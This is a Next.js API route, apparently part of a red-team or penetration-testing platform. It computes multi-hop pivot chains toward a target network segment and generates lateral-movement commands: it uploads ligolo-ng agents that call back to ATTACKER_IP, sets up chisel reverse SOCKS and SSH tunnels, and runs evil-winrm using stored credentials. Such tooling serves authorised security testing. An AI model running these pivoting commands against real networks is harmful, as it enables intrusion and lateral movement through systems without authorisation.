import { NextRequest } from "next/server";
import { prisma } from "@/lib/prisma";
import { apiSuccess, apiError } from "@/lib/api";

interface HopInfo {
  seq: number;
  fromSegment: { id: string; name: string; cidr: string };
  toSegment: { id: string; name: string; cidr: string };
  pivotHost: { id: string; ip: string; hostname: string };
  credential: { id: string; username: string; domain: string; secretType: string } | null;
  protocol: string;
  port: number;
  status: string;
}

function generateCommands(hops: HopInfo[]): string[] {
  if (hops.length === 0) return ["# Direct access — no pivot needed"];

  const commands: string[] = [];
  const sshHops = hops.filter((h) => h.protocol === "ssh");

  // All hops are SSH — generate ligolo-ng (primary) + SSH fallback commands
  if (sshHops.length === hops.length) {
    const jumpParts = sshHops.map((h) => {
      const user = h.credential?.username ?? "root";
      return h.port === 22 ? `${user}@${h.pivotHost.ip}` : `${user}@${h.pivotHost.ip}:${h.port}`;
    });

    const targetCidr = hops[hops.length - 1].toSegment.cidr;
    const lastHop = sshHops[sshHops.length - 1];
    const lastUser = lastHop.credential?.username ?? "root";
    const lastTarget = lastHop.port === 22
      ? `${lastUser}@${lastHop.pivotHost.ip}`
      : `${lastUser}@${lastHop.pivotHost.ip} -p ${lastHop.port}`;

    if (sshHops.length === 1) {
      commands.push(`# === Option 1: ligolo-ng (recommended) ===`);
      commands.push(`# SSH pivot to ${hops[0].toSegment.name} (${targetCidr})`);
      commands.push(`# 1. Ensure ligolo-proxy is running: ligolo-proxy -selfcert -laddr 0.0.0.0:11601`);
      commands.push(`# 2. Upload agent: scp ligolo-agent ${jumpParts[0]}:/tmp/agent`);
      commands.push(`# 3. Run agent: ssh ${jumpParts[0]} "chmod +x /tmp/agent && /tmp/agent -connect ATTACKER_IP:11601 -ignore-cert &"`);
      commands.push(`# 4. In ligolo console: session → start → sudo ip route add ${targetCidr} dev ligolo`);
      commands.push(``);
      commands.push(`# === Option 2: SSH SOCKS (fallback) ===`);
      commands.push(`ssh -D 1080 ${jumpParts[0]} -fN`);
      commands.push(`# Then use: proxychains4 <command>`);
    } else {
      const proxyJump = jumpParts.slice(0, -1).join(",");
      commands.push(`# Multi-hop SSH pivot to ${hops[hops.length - 1].toSegment.name} (${targetCidr})`);
      commands.push(`# === Option 1: ligolo-ng per hop (recommended) ===`);
      for (let i = 0; i < sshHops.length; i++) {
        const hop = sshHops[i];
        const user = hop.credential?.username ?? "root";
        const cidr = hop.toSegment.cidr;
        commands.push(`# Hop ${i + 1}: Upload ligolo-agent to ${user}@${hop.pivotHost.ip}, route ${cidr} dev ligolo`);
      }
      commands.push(``);
      commands.push(`# === Option 2: SSH ProxyJump (fallback) ===`);
      commands.push(`ssh -J ${proxyJump} ${lastTarget}`);
      commands.push(`# SOCKS proxy through chain:`);
      commands.push(`ssh -D 1080 -J ${proxyJump} ${lastTarget} -fN`);
    }

    return commands;
  }

  // Mixed protocols — generate per-hop commands
  for (const hop of hops) {
    const user = hop.credential?.username ?? "root";
    commands.push(`# Hop ${hop.seq}: ${hop.fromSegment.name} → ${hop.toSegment.name} via ${hop.pivotHost.hostname || hop.pivotHost.ip} (${hop.protocol})`);

    switch (hop.protocol) {
      case "ssh":
        commands.push(`ssh ${user}@${hop.pivotHost.ip}${hop.port !== 22 ? ` -p ${hop.port}` : ""}`);
        break;
      case "chisel":
        commands.push(`# Attacker: chisel server --reverse -p ${hop.port}`);
        commands.push(`# Pivot host: chisel client <ATTACKER>:${hop.port} R:socks`);
        break;
      case "ligolo":
        commands.push(`# Attacker: ligolo-proxy -selfcert -laddr 0.0.0.0:${hop.port}`);
        commands.push(`# Pivot host: ligolo-agent -connect <ATTACKER>:${hop.port} -ignore-cert`);
        break;
      case "winrm":
        commands.push(`evil-winrm -i ${hop.pivotHost.ip} -u ${user}`);
        break;
      case "socks":
        commands.push(`# Use proxychains with existing SOCKS proxy to ${hop.pivotHost.ip}`);
        break;
      default:
        commands.push(`# ${hop.protocol}: manual setup on ${hop.pivotHost.ip}:${hop.port}`);
    }
  }

  return commands;
}

export async function GET(request: NextRequest) {
  try {
    const target = request.nextUrl.searchParams.get("target");
    if (!target?.trim()) return apiError("target query parameter is required (segment ID or name)");

    // Resolve target segment by ID or name
    let targetSegment = await prisma.networkSegment.findUnique({ where: { id: target } });
    if (!targetSegment) {
      targetSegment = await prisma.networkSegment.findUnique({ where: { name: target } });
    }
    if (!targetSegment) return apiError(`Segment "${target}" not found`, 404);

    const segInfo = { id: targetSegment.id, name: targetSegment.name, cidr: targetSegment.cidr };

    // If directly reachable, no hops needed
    if (targetSegment.reachable) {
      return apiSuccess({
        target: segInfo,
        hops: [],
        hopCount: 0,
        reachable: true,
        commands: generateCommands([]),
      });
    }

    // Load all active pivot routes with relations
    const allRoutes = await prisma.pivotRoute.findMany({
      where: { status: "active" },
      include: {
        fromSegment: true,
        toSegment: true,
        pivotHost: { select: { id: true, ip: true, hostname: true } },
        credential: { select: { id: true, username: true, domain: true, secretType: true } },
      },
    });

    // Build reachable set
    const segments = await prisma.networkSegment.findMany();
    const reachableSet = new Set(segments.filter((s) => s.reachable).map((s) => s.id));

    // Build incoming edges: toSegmentId → routes that arrive at this segment
    const incomingEdges = new Map<string, typeof allRoutes>();
    for (const r of allRoutes) {
      const list = incomingEdges.get(r.toSegmentId) ?? [];
      list.push(r);
      incomingEdges.set(r.toSegmentId, list);
    }

    // BFS backward from target to find a reachable segment
    const visited = new Set<string>([targetSegment.id]);
    const parent = new Map<string, (typeof allRoutes)[0]>();
    const queue: string[] = [targetSegment.id];
    let foundReachable: string | null = null;

    const MAX_DEPTH = 10;
    let depth = 0;

    outer:
    while (queue.length > 0 && depth < MAX_DEPTH) {
      const levelSize = queue.length;
      for (let i = 0; i < levelSize; i++) {
        const current = queue.shift()!;
        const incoming = incomingEdges.get(current) ?? [];
        for (const route of incoming) {
          if (visited.has(route.fromSegmentId)) continue;
          visited.add(route.fromSegmentId);
          parent.set(route.fromSegmentId, route);

          if (reachableSet.has(route.fromSegmentId)) {
            foundReachable = route.fromSegmentId;
            break outer;
          }
          queue.push(route.fromSegmentId);
        }
      }
      depth++;
    }

    if (!foundReachable) {
      return apiSuccess({
        target: segInfo,
        hops: [],
        hopCount: 0,
        reachable: false,
        error: "No pivot chain found from any reachable segment to target",
        commands: [],
      });
    }

    // Reconstruct path: foundReachable → ... → target
    const hops: HopInfo[] = [];
    let cursor = foundReachable;
    let seq = 1;
    while (parent.has(cursor)) {
      const route = parent.get(cursor)!;
      hops.push({
        seq,
        fromSegment: { id: route.fromSegment.id, name: route.fromSegment.name, cidr: route.fromSegment.cidr },
        toSegment: { id: route.toSegment.id, name: route.toSegment.name, cidr: route.toSegment.cidr },
        pivotHost: route.pivotHost,
        credential: route.credential,
        protocol: route.protocol,
        port: route.port,
        status: route.status,
      });
      cursor = route.toSegmentId;
      seq++;
      if (seq > MAX_DEPTH) break;
    }

    return apiSuccess({
      target: segInfo,
      hops,
      hopCount: hops.length,
      reachable: true,
      commands: generateCommands(hops),
    });
  } catch (e) {
    return apiError(e instanceof Error ? e.message : "Unknown error", 500);
  }
}
